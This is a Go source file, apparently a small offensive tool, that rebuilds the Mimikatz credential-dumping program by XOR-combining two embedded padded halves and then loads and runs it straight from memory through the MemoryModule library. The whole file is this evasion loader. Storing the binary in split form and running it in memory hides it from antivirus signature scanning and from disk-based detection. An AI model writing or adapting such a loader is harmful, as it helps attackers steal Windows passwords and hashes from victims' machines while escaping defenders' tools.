package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"os"
	"runtime"
	"unsafe"
)

var (
	mimikatzPad0 []byte
	mimikatzPad1 []byte
	err          error
)

func main() {
	// load mimikatz
	if runtime.GOARCH == "amd64" {
		mimikatzPad0, err = Asset("mimikatz64.exe.0.pad")
		if err != nil {
			os.Exit(0)
		}
		mimikatzPad1, err = Asset("mimikatz64.exe.1.pad")
		if err != nil {
			os.Exit(0)
		}
	} else { // assume GOARCH 386
		mimikatzPad0, err = Asset("mimikatz32.exe.0.pad")
		if err != nil {
			os.Exit(0)
		}
		mimikatzPad1, err = Asset("mimikatz32.exe.1.pad")
		if err != nil {
			os.Exit(0)
		}

	}
	var mimikatzEXE []byte
	for index, bite := range mimikatzPad0 {
		mimikatzEXE = append(mimikatzEXE, []byte{bite ^ mimikatzPad1[index]}...)
	}
	handle := C.MemoryLoadLibrary(unsafe.Pointer(&mimikatzEXE[0]))
	if handle == nil {
		print("MemoryLoadLibrary failed")
		os.Exit(1)
	}

	// run mimikatz
	output := C.MemoryCallEntryPoint(handle)
	C.MemoryFreeLibrary(handle)
}
